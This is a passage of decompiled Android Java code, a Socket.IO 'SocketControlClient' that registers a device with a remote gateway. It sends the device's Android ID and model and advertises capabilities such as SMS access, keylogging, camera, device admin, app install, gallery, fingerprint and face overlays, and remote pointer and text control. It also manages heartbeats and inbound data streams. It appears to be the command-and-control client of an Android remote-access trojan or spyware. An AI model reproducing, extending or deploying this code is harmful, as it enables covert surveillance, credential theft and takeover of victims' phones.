                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i15 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i15, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar15 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar15), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i15, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar16 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar16), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i16 = 0;
                                int i17 = 0;
                                bArr = null;
                                while (true) {
                                    if (i16 < length) {
                                        Object obj3 = objArr[i16];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i17++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i16++;
                                    } else if (i17 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            try {
                w0.k kVar = sVarA.f3428e;
                if (kVar != 0) {
                    kVar.c("error", r8);
                }
            } catch (RuntimeException unused2) {
                Log.w("SocketControlClient", "failed to install Socket.IO manager error listener");
            }
        } catch (URISyntaxException e3) {
            throw new IllegalArgumentException("invalid gateway URL", e3);
        }
    }

    /* JADX WARN: Code duplicated, block: B:11:0x0026  */
    /* JADX WARN: Code duplicated, block: B:34:0x006a  */
    public static h2.m A(JSONObject jSONObject) {
        String str;
        String str2;
        if (!Boolean.FALSE.equals(jSONObject.opt("ok"))) {
            return null;
        }
        JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("error");
        Object objOpt = jSONObjectOptJSONObject == null ? null : jSONObjectOptJSONObject.opt("code");
        if (objOpt instanceof String) {
            String str3 = (String) objOpt;
            if (str3.matches("[a-z0-9_]{1,64}")) {
                str = str3;
            } else {
                str = "registration_rejected";
            }
        } else {
            str = "registration_rejected";
        }
        Object objOpt2 = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.opt("message") : null;
        if (!(objOpt2 instanceof String)) {
            str2 = "registration rejected";
            break;
        }
        str2 = (String) objOpt2;
        if (str2.isEmpty() || str2.length() > 160) {
            str2 = "registration rejected";
            break;
        }
        for (int i3 = 0; i3 < str2.length(); i3++) {
            if (Character.isISOControl(str2.charAt(i3))) {
                str2 = "registration rejected";
                break;
            }
        }
        String str4 = str2;
        Object objOpt3 = (jSONObjectOptJSONObject == null || !jSONObjectOptJSONObject.has("retryable")) ? jSONObject.opt("retryable") : jSONObjectOptJSONObject.opt("retryable");
        return new h2.m(str, str4, objOpt3 instanceof Boolean ? ((Boolean) objOpt3).booleanValue() : "server_busy".equals(str) || "store_unavailable".equals(str) || "duplicate_session".equals(str), N((jSONObjectOptJSONObject == null || !jSONObjectOptJSONObject.has("retryAfterMs")) ? jSONObject.opt("retryAfterMs") : jSONObjectOptJSONObject.opt("retryAfterMs")));
    }

    public static boolean H(h2.e eVar, h2.e eVar2) {
        return eVar2 != null && eVar.f1982d == eVar2.f1982d && eVar.f1979a.equals(eVar2.f1979a) && eVar.f1980b.equals(eVar2.f1980b);
    }

    public static int L(JSONObject jSONObject) throws IOException {
        long jM = M("version", jSONObject);
        if (jM >= -2147483648L && jM <= 2147483647L) {
            return (int) jM;
        }
        o2.l("version out of range");
        return 0;
    }

    public static long M(String str, JSONObject jSONObject) throws IOException {
        Object objOpt = jSONObject.opt(str);
        if (!(objOpt instanceof Number)) {
            o2.l(str.concat(" must be an integer"));
            return 0L;
        }
        Number number = (Number) objOpt;
        long jLongValue = number.longValue();
        if (number.doubleValue() == jLongValue) {
            return jLongValue;
        }
        o2.l(str.concat(" must be an integer"));
        return 0L;
    }

    public static long N(Object obj) {
        if (!(obj instanceof Number)) {
            return -1L;
        }
        Number number = (Number) obj;
        long jLongValue = number.longValue();
        if (number.doubleValue() != jLongValue || jLongValue <= 0) {
            return -1L;
        }
        return jLongValue;
    }

    public static String O(String str, JSONObject jSONObject) throws IOException {
        Object objOpt = jSONObject.opt(str);
        if (objOpt instanceof String) {
            return (String) objOpt;
        }
        o2.l(str.concat(" must be a string"));
        return null;
    }

    public static long a(long j3, long j4) {
        if (j3 <= 0) {
            return -1L;
        }
        return Math.max(0L, j4 - j3);
    }

    public static String c(String str, int i3) {
        if (str == null || str.isEmpty()) {
            return "";
        }
        StringBuilder sb = new StringBuilder(Math.min(str.length(), i3));
        for (int i4 = 0; i4 < str.length() && sb.length() < i3; i4++) {
            char cCharAt = str.charAt(i4);
            if (Character.isISOControl(cCharAt)) {
                cCharAt = ' ';
            }
            sb.append(cCharAt);
        }
        return sb.toString().trim();
    }

    public static JSONObject d(h2.h hVar) throws JSONException {
        JSONObject jSONObjectPut = new JSONObject().put("video", true).put("control", true).put("files", true).put("notifications", true).put("sms", hVar.f2042q).put("keylog", hVar.f2043r).put("dailyKeylog", hVar.f2044s).put("camera", hVar.f2045t).put("battery", hVar.f2046u).put("deviceAdmin", hVar.f2047v).put("postNotif", hVar.f2048w).put("install", hVar.f2049x);
        int i3 = hVar.f2027a;
        if (i3 > 0) {
            jSONObjectPut.put("controlProtocolEpoch", i3);
        }
        if (hVar.f2028b) {
            jSONObjectPut.put("controlActionV2", true);
        }
        if (hVar.f2029c) {
            jSONObjectPut.put("controlDeadlineV1", true);
        }
        if (hVar.f2030d) {
            jSONObjectPut.put("controlPointerV1", true);
        }
        if (hVar.f2031e) {
            jSONObjectPut.put("controlAckV1", true);
        }
        if (hVar.f2032f) {
            jSONObjectPut.put("textEditV1", true);
        }
        if (hVar.f2033g) {
            jSONObjectPut.put("pacedTextV1", true);
        }
        if (hVar.f2034h) {
            jSONObjectPut.put("wakeGestureV1", true);
        }
        if (hVar.f2035i) {
            jSONObjectPut.put("controlResumeV1", true);
        }
        if (hVar.f2036j) {
            jSONObjectPut.put("fingerprintOverlayV1", true);
        }
        if (hVar.f2037k) {
            jSONObjectPut.put("fingerprintOverlayV2", true);
        }
        if (hVar.f2038l) {
            jSONObjectPut.put("faceOverlayV1", true);
        }
        if (hVar.f2039m) {
            jSONObjectPut.put("webpTransport", true);
        }
        if (hVar.n) {
            jSONObjectPut.put("mediaDemandV1", true);
        }
        if (hVar.f2040o) {
            jSONObjectPut.put("nodeSyncV3", true);
        }
        if (hVar.f2041p) {
            jSONObjectPut.put("galleryV1", true);
        }
        if (hVar.f2050y) {
            jSONObjectPut.put("appInventoryV1", true);
        }
        if (hVar.f2051z) {
            jSONObjectPut.put("captureExistingGrantOnlyV1", true);
        }
        if (hVar.A) {
            jSONObjectPut.put("projectionGrantReady", true);
        }
        return jSONObjectPut;
    }

    public static String h(String str) {
        String strA = a4.a(str);
        if (strA == null) {
            o2.i("gateway URL must use WSS with a public FQDN");
            return null;
        }
        try {
            try {
                return new URI("https", new URI(strA).getRawAuthority(), null, null, null).toString();
            } catch (URISyntaxException e3) {
                throw new IllegalArgumentException("invalid gateway origin", e3);
            }
        } catch (URISyntaxException e4) {
            throw new IllegalArgumentException("invalid gateway URL", e4);
        }
    }

    public static h2.h i(h2.h hVar) {
        h2.h hVar2 = new h2.h();
        if (hVar == null) {
            return hVar2;
        }
        hVar2.f2027a = hVar.f2027a;
        hVar2.f2028b = hVar.f2028b;
        hVar2.f2029c = hVar.f2029c;
        hVar2.f2030d = hVar.f2030d;
        hVar2.f2031e = hVar.f2031e;
        hVar2.f2032f = hVar.f2032f;
        hVar2.f2033g = hVar.f2033g;
        hVar2.f2034h = hVar.f2034h;
        hVar2.f2035i = hVar.f2035i;
        hVar2.f2036j = hVar.f2036j;
        hVar2.f2037k = hVar.f2037k;
        hVar2.f2038l = hVar.f2038l;
        hVar2.f2039m = hVar.f2039m;
        hVar2.n = hVar.n;
        hVar2.f2040o = hVar.f2040o;
        hVar2.f2041p = hVar.f2041p;
        hVar2.f2042q = hVar.f2042q;
        hVar2.f2043r = hVar.f2043r;
        hVar2.f2044s = hVar.f2044s;
        hVar2.f2045t = hVar.f2045t;
        hVar2.f2046u = hVar.f2046u;
        hVar2.f2047v = hVar.f2047v;
        hVar2.f2048w = hVar.f2048w;
        hVar2.f2049x = hVar.f2049x;
        hVar2.f2050y = hVar.f2050y;
        hVar2.f2051z = hVar.f2051z;
        hVar2.A = hVar.A;
        return hVar2;
    }

    public static w0.a k(Object[] objArr) {
        if (objArr == null) {
            return null;
        }
        for (Object obj : objArr) {
            if (obj instanceof w0.a) {
                return (w0.a) obj;
            }
        }
        return null;
    }

    public static JSONObject l(Object[] objArr) {
        if (objArr == null) {
            return null;
        }
        for (Object obj : objArr) {
            if (obj instanceof JSONObject) {
                return (JSONObject) obj;
            }
            if (obj instanceof Map) {
                return new JSONObject((Map) obj);
            }
        }
        return null;
    }

    public static JSONObject n(long j3, long j4, long j5) {
        try {
            JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("generation", j3);
            if (j4 > 0) {
                jSONObjectPut.put("sequence", j4);
            }
            if (j5 > 0) {
                jSONObjectPut.put("clientSentElapsedMs", j5);
            }
            return jSONObjectPut;
        } catch (JSONException e3) {
            throw new IllegalStateException(e3);
        }
    }

    public static long o(JSONObject jSONObject) {
        Object objOpt = jSONObject.opt("sequence");
        if (objOpt instanceof Number) {
            long jLongValue = ((Number) objOpt).longValue();
            if (jLongValue > 0) {
                return jLongValue;
            }
        }
        return 0L;
    }

    public static boolean q(JSONObject jSONObject, long j3) {
        try {
            return L(jSONObject) == 1 && M("generation", jSONObject) == j3;
        } catch (IOException unused) {
            return false;
        }
    }

    public static JSONObject u(boolean z2, h2.j jVar, String str) {
        try {
            JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("ok", z2);
            if (jVar != null) {
                jSONObjectPut.put("kind", jVar.f2055c).put("active", jVar.f2054b).put("demandEpoch", jVar.f2053a);
                Long l3 = (Long) jVar.f2056d;
                if (l3 != null) {
                    jSONObjectPut.put("gatewayGeneration", l3);
                }
            }
            if (!z2) {
                jSONObjectPut.put("error", str);
            }
            return jSONObjectPut;
        } catch (JSONException e3) {
            throw new IllegalStateException(e3);
        }
    }

    public static w0.b x(SocketFactory socketFactory, y.c cVar, y.c cVar2) {
        w0.b bVar = new w0.b();
        bVar.f6099b = "/socket.io/";
        bVar.f6069k = new String[]{"websocket"};
        bVar.f3376s = true;
        bVar.n = false;
        bVar.f3372o = 0;
        bVar.f3375r = Collections.singletonMap("role", "device");
        i2.t tVar = new i2.t();
        TimeUnit timeUnit = TimeUnit.MILLISECONDS;
        timeUnit.getClass();
        tVar.f2234w = j2.b.b(0L, timeUnit);
        timeUnit.getClass();
        tVar.f2235x = j2.b.b(0L, timeUnit);
        tVar.f2217e = new d2.o(5, cVar);
        if (socketFactory != null) {
            tVar.a(socketFactory);
        }
        i2.u uVar = new i2.u(tVar);
        bVar.f6107j = uVar;
        bVar.f6106i = new y.e(uVar, cVar2);
        return bVar;
    }

    public static h2.j y(JSONObject jSONObject, h2.e eVar) throws IOException {
        Long lValueOf;
        if (jSONObject == null) {
            o2.l("media demand session required");
            return null;
        }
        Iterator<String> itKeys = jSONObject.keys();
        while (itKeys.hasNext()) {
            String next = itKeys.next();
            if (!"kind".equals(next) && !"active".equals(next) && !"demandEpoch".equals(next) && !"gatewayGeneration".equals(next)) {
                o2.l("unknown media demand field");
                return null;
            }
        }
        String strO = O("kind", jSONObject);
        Object objOpt = jSONObject.opt("active");
        if (!(objOpt instanceof Boolean)) {
            o2.l("active must be boolean");
            return null;
        }
        long jM = M("demandEpoch", jSONObject);
        if (jM <= 0) {
            o2.l("media demand epoch required");
            return null;
        }
        if (jSONObject.has("gatewayGeneration")) {
            long jM2 = M("gatewayGeneration", jSONObject);
            lValueOf = Long.valueOf(jM2);
            if (jM2 <= 0 || jM2 != eVar.f1982d) {
                o2.l("stale gatewayGeneration");
                return null;
            }
        } else {
            lValueOf = null;
        }
        try {
            return new h2.j(strO, ((Boolean) objOpt).booleanValue(), jM, lValueOf);
        } catch (IllegalArgumentException e3) {
            throw new IOException(e3.getMessage(), e3);
        }
    }

    public static h2.e z(JSONObject jSONObject) throws IOException {
        String str;
        String str2;
        if (L(jSONObject) != 1) {
            o2.l("unsupported registered version");
            return null;
        }
        String strO = O("deviceId", jSONObject);
        String strO2 = O("sessionId", jSONObject);
        String strO3 = O("mediaToken", jSONObject);
        long jM = M("generation", jSONObject);
        long jM2 = M("serverTime", jSONObject);
